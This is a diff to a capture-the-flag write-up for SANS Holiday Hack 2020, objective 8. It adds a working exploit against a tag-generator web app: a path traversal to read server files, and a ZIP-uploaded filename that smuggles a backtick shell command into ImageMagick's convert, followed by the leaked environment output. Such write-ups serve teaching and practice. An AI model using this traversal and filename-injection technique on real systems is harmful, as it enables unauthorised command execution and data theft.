@@ -31,9 +31,35 @@ The [Ruby application code](https://github.com/joergschwarzwaelder/hhc2020/blob/
 curl https://tag-generator.kringlecastle.com/image?id=../../../../../app/lib/app.rb --output app.rb
 ```
 This code allows to place uploaded files in a chosen place on the remote system using the ZIP upload function.
-Furthermore the application starts the `convert` tool from  ImageMagick
+Furthermore the application starts the `convert` tool from  ImageMagick which makes it possible to inject shell commands:
+```
+jsw@io:~/Documents/Hacking-Challenges/Holidayhack-2020/objective-8/test/z$ touch \'\`env\>joergen\`\;\'.jpg
+jsw@io:~/Documents/Hacking-Challenges/Holidayhack-2020/objective-8/test/z$ rm joergen.zip
+rm: cannot remove 'joergen.zip': No such file or directory
+jsw@io:~/Documents/Hacking-Challenges/Holidayhack-2020/objective-8/test/z$ zip joergen.zip *.jpg
+  adding: '`env>joergen`;'.jpg (stored 0%)
+jsw@io:~/Documents/Hacking-Challenges/Holidayhack-2020/objective-8/test/z$ curl https://tag-generator.kringlecastle.com/upload -F'my_file[]=@joergen.zip'
+["7ebc17be-a3ea-48f5-95ea-730e1b006520.jpg"]jsw@io:~/Documents/Hacking-Challenges/Holidayhack-2020/objective-8/test/z$ sleep 5
+jsw@io:~/Documents/Hacking-Challenges/Holidayhack-2020/objective-8/test/z$ curl https://tag-generator.kringlecastle.com/image?id=../../../../../tmp/joergen
+RUBY_MAJOR=2.7
+GREETZ=JackFrostWasHere
+HOSTNAME=cbf2810b7573
+PORT=4141
+HOME=/home/app
+BUNDLE_APP_CONFIG=/usr/local/bundle
+RUBY_VERSION=2.7.0
+RACK_ENV=development
+APP_HOME=/app
+PATH=/usr/local/bundle/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
+HOST=0.0.0.0
+GEM_HOME=/usr/local/bundle
+RUBY_DOWNLOAD_SHA256=27d350a52a02b53034ca0794efe518667d558f152656c2baaf08f3d0c8b02343
+PWD=/tmp
+BUNDLE_SILENCE_ROOT_WARNING=1
+
+```
 <!--stackedit_data:
-eyJoaXN0b3J5IjpbLTQ5NTA4NDE3MSwxOTMzMzYxNzg3LC0xND
-Y3NjE1MjYyLC0yNDM5NDI4NjYsMTMxMjA1NjQ1Myw5MjA0NTU4
-NjUsLTE2MDYwNzgwNDBdfQ==
+eyJoaXN0b3J5IjpbLTEwMjM4MTc2MTksMTkzMzM2MTc4NywtMT
+Q2NzYxNTI2MiwtMjQzOTQyODY2LDEzMTIwNTY0NTMsOTIwNDU1
+ODY1LC0xNjA2MDc4MDQwXX0=
 -->
